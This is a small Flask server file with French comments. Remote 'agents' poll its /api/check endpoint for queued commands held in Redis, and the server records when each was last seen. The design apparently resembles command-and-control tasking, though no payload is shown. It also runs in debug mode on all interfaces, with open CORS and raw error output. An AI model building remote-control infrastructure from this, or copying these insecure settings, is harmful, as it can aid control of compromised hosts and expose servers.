from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import datetime
import os
import redis

app = Flask(__name__)
CORS(app)

def get_redis_client():
    try:
        redis_url = os.environ.get("UPSTASH_REDIS_REST_URL")
        if not redis_url:
            redis_url = "redis://localhost:6379"
        return redis.from_url(redis_url)
    except Exception as e:
        print(f"Erreur de connexion Redis: {e}")
        return None

redis_client = get_redis_client()

@app.route('/api/check', methods=['POST'])
def check_commands():
    """L'agent vient chercher des commandes"""
    try:
        if not redis_client:
            return jsonify({'error': 'Redis not connected'}), 500
        
        data = request.json
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'agent_id required'}), 400
        
        key = f"agent:{agent_id}"
        existing = redis_client.get(key)
        
        if not existing:
            return jsonify({'error': 'Agent not found'}), 404
        
        agent_data = json.loads(existing.decode('utf-8'))
        
        # Mettre à jour le timestamp
        agent_data['last_seen'] = datetime.datetime.now().isoformat()
        
        # Récupérer les commandes en attente
        commands = agent_data.get('commands', [])
        agent_data['commands'] = []  # Vider après lecture
        
        # Sauvegarder
        redis_client.set(key, json.dumps(agent_data))
        
        return jsonify({'commands': commands})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

def handler(request):
    return app(request)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=True)
